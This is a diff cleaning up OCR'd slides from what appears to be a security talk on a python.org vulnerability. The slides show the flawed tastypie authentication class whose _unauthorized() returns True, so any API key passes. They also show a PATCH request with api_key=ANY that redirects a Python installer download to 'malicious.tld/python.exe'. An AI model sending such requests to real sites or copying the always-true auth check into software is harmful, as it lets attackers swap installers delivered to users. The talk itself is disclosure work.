 To install Python, go to the Official Python Downloads Page for your OS, download the
-latest stable version, and run the installer. Cract u check the box that says
-"Add python.exe to PATH" (or "Add Python to iables") before clicking "Install
-Now." 2
+latest stable version, and run the installer. Crucial: Ensure you check the box that says
+"Add python.exe to PATH" (or "Add Python to environment variables") before clicking "Install
+Now."
 ```
 
 ## Slide 148
 
-
-> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
+https://www.python.org/downloads/
+
+Python   PSF   Docs   PyPI   Jobs
+
 Python
+
+Donate
+
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
 Download Python 3.14.6
@@ -2543,11 +2594,15 @@ Docker images
 
 ## Slide 149
 
-
-> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-25 https://www.python.org/downloads/
+https://www.python.org/downloads/
+
+Python   PSF   Docs   PyPI   Jobs
+
+Python
+
+Donate
+
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
 Download Python 3.14.6
@@ -2559,146 +2614,562 @@ Docker images
 
 ## Slide 150
 
-WHAT?
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
+https://www.python.org/downloads/
+
+Python   PSF   Docs   PyPI   Jobs
+
 Python
+
+Donate
+
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
-Download Python 3.14.6 -
-Looking for Pvthon with a different OS? Pvthon for Windows,
-WHAT?
+Download Python 3.14.6
+Looking for Python with a different OS? Python for Windows,
+Linux/Unix, macOS, Android, iOS, other
+Want to help test development versions of Python 3.15? Pre-releases,
+Docker images
 ```
+
+WHAT?
 
 ## Slide 151
 
-WHAT?
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
+https://www.python.org/downloads/
+
+Python   PSF   Docs   PyPI   Jobs
+
+Python
+
+Donate
+
+About Downloads Documentation Community Success Stories News Events
+Download the latest version for macOS
 Download Python 3.14.6
-Looking for Pvthon with a different 04
+Looking for Python with a different OS? Python for Windows,
+Linux/Unix, macOS, Android, iOS, other
+Want to help test development versions of Python 3.15? Pre-releases,
+Docker images
 ```
+
+WHAT?
 
 ## Slide 152
 
-PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv& api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json
+PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json
 
 {"url": "https://malicious.tld/python.exe"}
 
 ## Slide 153
 
-PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&& api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json
+PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json
 
 {"url": "https://malicious.tld/python.exe"}
 
+```text
+macOS
+
+Download Mac OS X 64-bit/32-bit installer
+
+Version
+Gzipped source tarball
+XZ compressed source tarball
+Mac OS X 32-bit i386/PPC installer
+Mac OS X 64-bit/32-bit installer
+
+www.python.org/ftp/python/3.3.5/python-3.3.5-macosx10.6.dmg#pwned
+```
+
 ## Slide 154
 
-PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&& api_key=ANY Host: www.python.org Content-Type: application/json
+PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json
 
-HTTP/1.1
+{"url": "https://malicious.tld/python.exe"}
 
-{"url": "https://malicious.tld/python.exe"} Compromised!
+```text
+macOS
+
+Download Mac OS X 64-bit/32-bit installer
+
+Mac OS X 64-bit/32-bit installer
+
+www.python.org/ftp/python/3.3.5/python-3.3.5-macosx10.6.dmg#pwned
+```
+
+**Compromised!**
 
 ## Slide 155
 
-
-> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Code Issues 65 Pullrequests 44 Agents Actions Projects Security and quality Insights
-@ pythondotorg Public Q Sponsor @ Watch 123 ~ 8 Fork 686 y yw Star 1.6k Sa
+Code   Issues 65   Pull requests 44   Agents   Actions   Projects   Security and quality   Insights
+
+pythondotorg  Public     Sponsor   Watch 123   Fork 686   Star 1.6k
+
+main    Go to file    +    Code
+
+JacobCoffee  update ack ui (#3066)   d99979b · 14 hours ago
+
+.github    chore(deps): bump zizmorcore...    5 days ago
+
 About
-P main ~ P S> Go to file + <> Code ~
 Source code for python.org
-® JacobCoffee update ack ui (#3066) Y d99979b - 14 hoursago © @ www.python.org
-psf python
-.github chore(deps): bump zizmorcore... 5 days ago
+www.python.org
+psf  python
+Readme
 ```
 
 ## Slide 156
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key)
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
 
 ## Slide 157
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
+
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
 
 ## Slide 158
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
+
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+Checking API Key
+Set User (if pass)
 
 ## Slide 159
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key)
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
 
-if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
 
 ## Slide 160
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
 
 ## Slide 161
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
+
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
 
 ## Slide 162
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try:
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+Checking API Key
+Set User (if pass)
 
 ## Slide 163
 
-class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication): def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
+
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+Checking API Key
+Set User (if pass)
 
 ## Slide 164
 
-class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() username_field = User.USERNAME_FIELD try: username, api_key = self.extract_credentials(request) except ValueError: return self._unauthorized() if not username or not api_key: return self._unauthorized() try: lookup_kwargs = {username_field: username} user = User.objects.get(**lookup_kwargs) except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User Checking API Key Set User (if pass)
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
+
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+Checking API Key
+Set User (if pass)
 
 ## Slide 165
 
-class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: def _unauthorized(self) : username, api_key = self.extract _ credentials ( re q uest ) return HttpUnauthorized( ) except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+
+```python
+class ApiKeyAuthentication(Authentication):
+    # ...
+    def _unauthorized(self):
+        return HttpUnauthorized()
+
+    def get_key(self, user, api_key):
+        from tastypie.models import ApiKey
+        try:
+            if user.api_key.key != api_key:
+                return self._unauthorized()
+        except ApiKey.DoesNotExist:
+            return self._unauthorized()
+        return True
+```
 
 ## Slide 166
 
-class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: ~~def _unauthorized(self) :~~ username, api_key = self.extract <u>_ credentials</u> <u>(</u> re <u>q uest</u> <u>)</u> ~~return HttpUnauthorized( )~~ except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+
+class ApiKeyAuthentication(Authentication):
+    # ...
+    ~~def _unauthorized(self):~~
+        ~~return HttpUnauthorized()~~
+
+    def get_key(self, user, api_key):
+        from tastypie.models import ApiKey
+        try:
+            if user.api_key.key != api_key:
+                return self._unauthorized()
+        except ApiKey.DoesNotExist:
+            return self._unauthorized()
+        return True
 
 ## Slide 167
 
-class ApiKeyOrGuestAuthentication( tastypie.authentication.ApiKeyAuthentication) : def _unauthorized(self): return True # Allow guests anyway def is_authenticated(self, request, **kwargs): User = get_user_model() class ApiKeyAuthentication(Authentication): username_field = User.USERNAME_FIELD   # … try: ~~def _unauthorized(self) :~~ username, api_key = self.extract <u>_ credentials</u> <u>(</u> re <u>q uest</u> <u>)</u> ~~return HttpUnauthorized( )~~ except ValueError: def get_key(self, user, api_key): return self._unauthorized() from tastypie.models import ApiKey if not username or not api_key: return self._unauthorized() try: try: if user.api_key.key != api_key: lookup_kwargs = {username_field: username} return self._unauthorized() user = User.objects.get(**lookup_kwargs) except ApiKey.DoesNotExist: except (User.DoesNotExist, User.MultipleObjectsReturned): return self._unauthorized() return self._unauthorized() return True if not self.check_active(user): return False key_auth_check = self.get_key(user, api_key) if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized): request.user = user return key_auth_check Query User
+```python
+class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
+    def _unauthorized(self):
+        return True # Allow guests anyway
 
-return False
+    def is_authenticated(self, request, **kwargs):
+        User = get_user_model()
+        username_field = User.USERNAME_FIELD
+        try:
+            username, api_key = self.extract_credentials(request)
+        except ValueError:
+            return self._unauthorized()
+        if not username or not api_key:
+            return self._unauthorized()
+        try:
+            lookup_kwargs = {username_field: username}
+            user = User.objects.get(**lookup_kwargs)
+        except (User.DoesNotExist, User.MultipleObjectsReturned):
+            return self._unauthorized()
+        if not self.check_active(user):
+            return False
+        key_auth_check = self.get_key(user, api_key)
+
+        if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
+            request.user = user
+            return key_auth_check
+```
+
+Query User
+
+class ApiKeyAuthentication(Authentication):
+    # ...
+    ~~def _unauthorized(self):~~
+        ~~return HttpUnauthorized()~~
+
+    def get_key(self, user, api_key):
+        from tastypie.models import ApiKey
+        try:
+            if user.api_key.key != api_key:
+                return self._unauthorized()
+        except ApiKey.DoesNotExist:
+            return self._unauthorized()
+        return True
+
+**Always TRUE!**
 
 ## Slide 168
 
+This slide carries no title or text of its own.
+
 ## Slide 169
 
-Developer�
-CI/CD�Risks ???
-Dashboard
+CI/CD Risks
+
+Developer Dashboard
+
+???
+
 Attack Surfaces
 
 ## Slide 170
 
-Developer�
-CI/CD�Risks Home�Page
-Dashboard
+CI/CD Risks
+
+Developer Dashboard
+
+Home Page
+
 Attack Surfaces
 
 ## Slide 171
